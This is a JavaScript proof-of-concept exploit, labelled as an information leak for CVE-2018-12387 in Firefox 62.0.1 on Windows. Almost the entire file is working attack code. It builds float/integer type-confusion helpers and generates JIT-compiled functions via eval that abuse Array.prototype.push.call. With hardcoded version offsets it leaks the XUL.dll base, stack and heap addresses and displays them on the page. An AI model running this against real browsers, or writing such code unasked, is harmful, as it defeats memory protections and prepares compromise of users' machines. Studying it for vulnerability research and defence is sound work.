// Infoleak exploit for CVE-2018-12387
// Firefox 62.0.1 Windows
var convert = new ArrayBuffer(0x100);
var u32 = new Uint32Array(convert);
var f64 = new Float64Array(convert);

var BASE = 0x100000000;

function i2f(x) {
    u32[0] = x % BASE;
    u32[1] = (x - (x % BASE)) / BASE;
    return f64[0];
}

function f2i(x) {
    f64[0] = x;
    return u32[0] + BASE * u32[1];
}

function hex(x) {
    return `0x${x.toString(16)}`
}

var test = {a:0x1337};

function gen(m) {
    var expr = '1+('.repeat(m) + '{a:y}' + ')'.repeat(m);

    var code = `
    f = function(o) {
        var y = test;
        var a = [o];
        a.length = a[0];
        var useless = function() {
            // This function will get called instead of Array.prototype.push.call
        }
        useless + useless + useless + useless + useless + useless;
        var sz = Array.prototype.push.call(a, 1337, 43);
        (function() { sz; })();
        var o = ${expr};
    }
    `;
    eval(code);
}

VERSION = '62.0';

var xul = 0;
var stack = 0;
var heap = 0;

var leak = [];
for (var i = 20; i >= 0; --i) {
    gen(i);
    for (var j = 0; j < 10000; j++) {
        f(1);
    }
    f(100);

    var x = f2i(test.a);

    leak.push(x);
}

function xulbase(addr) {
    if (VERSION == '62.0') {
        var offsets = [
            0x92fe34,
            0x3bd4108,
        ];
    } else {
        print('Unknown version: ' + VERSION);
        throw null;
    }
    var res = 0;
    offsets.forEach((offset) => {
        if (offset % 0x1000 == addr % 0x1000) {
            res = addr - offset;
        }
    });
    return res;
}

xul = xulbase(leak[1]);
stack = leak[0];
heap = leak[3];

var el = document.createElement('pre');
el.innerText = (
    "XUL.dll base: " + hex(xul) + "\n" +
    "Stack: " + hex(stack) + "\n" +
    "Heap: " + hex(heap) + "\n" +
    "\nFull leak:\n" + leak.map(hex).join("\n"))
document.body.appendChild(el);
